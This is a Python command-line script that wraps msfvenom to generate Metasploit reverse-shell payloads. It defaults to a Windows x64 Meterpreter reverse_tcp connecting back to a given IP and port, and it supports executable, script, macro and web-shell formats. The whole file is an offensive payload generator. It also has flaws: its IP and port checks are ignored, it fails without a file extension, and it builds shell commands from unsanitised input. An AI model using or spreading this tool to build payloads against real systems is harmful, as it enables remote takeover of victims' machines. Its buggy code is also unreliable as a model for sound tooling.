import argparse
import sys
import subprocess
import re



if len(sys.argv) < 4:
    print("Usage: python3 createmsf.py -o <output_file> -i <ip_address> -p <port> (Optional: -s <payload>)")
    sys.exit(1)

def start_printing():
    print("A simple tools to help create metasploit reverse shells.")
    print("Options")
    print("-o, --output     Name of output file (example.exe)")
    print("-i, --ip         IP Address to connect back to (LHOST) ")
    print("-p, --port       Port Nmber to connect back to")
    print("-s, --payload    Specifies payload to use (uses windows/x64/meterpreter/reverse_tcp by default)" )



parser = argparse.ArgumentParser(description="A simple tools to help create metasploit reverse shells.")
parser.add_argument("-o", "--output", type=str, help="Name of output file")
parser.add_argument("-i", "--ip", type=str, required= True, help="IP Address to connect back to (LHOST)")
parser.add_argument("-p", "--port", type=int, required= True, help="Port Number to connect back to")
parser.add_argument("-s", "--payload", type=str, required= False, help="Specify specific payload (uses windows/x64/meterpreter/reverse_tcp by default)")


args = parser.parse_args()

ip_addr = args.ip
output_file = args.output
port = args.port 
payload = args.payload

if not any(vars(args).values()):
    start_printing()



def split_from_extension(word):
    if "." in word:
        lead_word, extension = word.split(".")
        return lead_word, extension
    
file_and_extension = split_from_extension(output_file)

if file_and_extension:
    output_file = file_and_extension[0]
    extension = file_and_extension[1]
    



def check_ip(ip):
    # Define IP address pattern
    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    # Define network interface pattern
    iface_pattern = r'^(eth|tun|docker)\d+$'
    
    # Check if the input matches either an IP pattern or an interface pattern
    if re.fullmatch(ip_pattern, ip) or re.fullmatch(iface_pattern, ip):
        return True
    else:
        print(f"Invalid IP or interface pattern: {ip}")
        return False
    



def check_port(port):
    
    try:
        port_num = int(port)
        if 1 <= port_num <= 65535:
            return True
        else:
            print(f"Invalid Port Number: {port} - Must be between 1 and 65535")
            return False

    except (ValueError, TypeError):
        print(f"Invalid Port Number: {port} - Must be an integer")
        return False
    


check_ip(ip_addr)
check_port(port)


if "." in extension:
    extension = extension.replace(".", "")



def create_msf(output_file, extension, ip, port, payload):
    regular_extensions = [
        'asp', 'aspx', 'aspx-exe', 'axis2', 'dll', 'ducky-script-psh', 'elf', 'elf-so', 'exe', 
        'exe-only', 'exe-service', 'exe-small', 'hta-psh', 'jar', 'jsp', 'loop-vbs', 'macho', 
        'msi', 'msi-nouac', 'osx-app', 'psh', 'psh-cmd', 'psh-net', 'psh-reflection', 
        'python-reflection', 'vba', 'vba-exe', 'vba-psh', 'vbs', 'war'
    ]
    
    # Determine the correct format flag
    if extension in regular_extensions:
        format_flag = extension
        msf_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format_flag} -o {output_file}.{extension}"
    else:
        # If the extension is not regular, default to raw output
        msf_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > {output_file}.{extension}"

    if payload:
        msf_command = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f raw > {output_file}.{extension}"
    
    # print(msf_command)  # To verify the generated command

    # Run the command
    try:
        result = subprocess.run(
            msf_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if result.returncode == 0:
            print("File created successfully.")
        else:
            print("Error creating file.")

    except subprocess.SubprocessError as e:
        print(f"Error creating file: {e}")



create_msf(output_file, extension, ip_addr , port, payload)




# def check_extensions(extension):
#     global msf_command
#     regular_extensions = ['asp', 'aspx', 'aspx-exe', 'axis2', 'dll', 'ducky-script-psh', 'elf', 'elf-so', 'exe', 'exe-only', 'exe-service', 'exe-small', 'hta-psh', 'jar', 'jsp', 'loop-vbs', 'macho', 'msi', 'msi-nouac', 'osx-app', 'psh', 'psh-cmd', 'psh-net', 'psh-reflection', 'python-reflection', 'vba', 'vba-exe', 'vba-psh', 'vbs', 'war']
#     if extension not in regular_extensions:
#         msf_command = f"msfvenom -p {payload} LHOST={ip_addr} LPORT={port} -f raw > {output_file}.{extension}"

# def check_for_payload(payload):
#         global msf_command
#         msf_command = f"msfvenom -p {payload} LHOST={ip_addr} LPORT={port} -f {extension} -o {output_file}.{extension}"



# def create_msf(output_file, extension, ip, port, payload):
#     global msf_command
#     check_extensions(extension)
#     check_for_payload(payload)
#     msf_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {extension} -o {output_file}.{extension}"
    

#     print(msf_command)
#     print(extension)
    # try:
    #     result = subprocess.run(msf_command, 
    #                       shell=True, 
    #                       stdout=subprocess.PIPE, # Records output to be used later but doesn't display, if you want to dicard totally do subprocess.DEVNULL
    #                       stderr=subprocess.PIPE, # Captures Error to be used later but doesn't display, if you want to dicard totally do subprocess.DEVNULL
    #                       text=True)
    
    # # Check if successful (optional)
    #     if result.returncode == 0: # Remember response code of successful op is 0 and unsuccessful is 1
    #         print("File created successfully")
    #     else:
    #         print("Error creating file")
    #         print(f"Check payload {payload}")
    # except subprocess.SubprocessError as e:
    #     print(f"Error creating file: {e}")
        